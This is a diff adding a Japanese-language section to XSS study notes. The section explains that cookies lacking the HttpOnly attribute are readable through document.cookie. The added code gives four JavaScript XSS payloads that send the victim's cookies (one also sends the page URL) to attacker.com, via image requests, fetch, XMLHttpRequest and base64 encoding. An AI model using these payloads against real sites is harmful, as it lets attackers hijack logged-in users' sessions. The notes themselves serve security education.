@@ -16,3 +16,31 @@ XSS脆弱性のあるWebアプリケーションでは、以下の影響を受�
 ![[Stored XSS]]
 
 ![[Content Security Policy#実行できるスクリプトについて]]
+
+## 適切に保護されていないCookieを窃取するXSSサンプル
+`Secure`しか設定されていないCookienに対して、以下のようなXSSでログイン中ユーザのCookieを盗み出すことができる。
+`HttpOnly`(Javascriptからのアクセスを禁止する属性)が設定されていないCookieでは、`document.cookie`に保存されているので、スクリプトによってアクセスは可能
+```javascript
+// Common XSS payload formats:
+
+// Basic - Send to attacker's server
+new Image().src = "http://attacker.com/collect?cookie=" + document.cookie;
+
+// Using fetch API
+fetch('https://attacker.com/collect', {
+    method: 'POST',
+    body: JSON.stringify({
+        cookie: document.cookie,
+        url: window.location.href
+    })
+});
+
+// Using XMLHttpRequest
+let xhr = new XMLHttpRequest();
+xhr.open('POST', 'https://attacker.com/collect', true);
+xhr.send(document.cookie);
+
+// Base64 encoding to avoid special characters issues
+let encodedData = btoa(document.cookie);
+new Image().src = "http://attacker.com/collect?data=" + encodedData;
+```
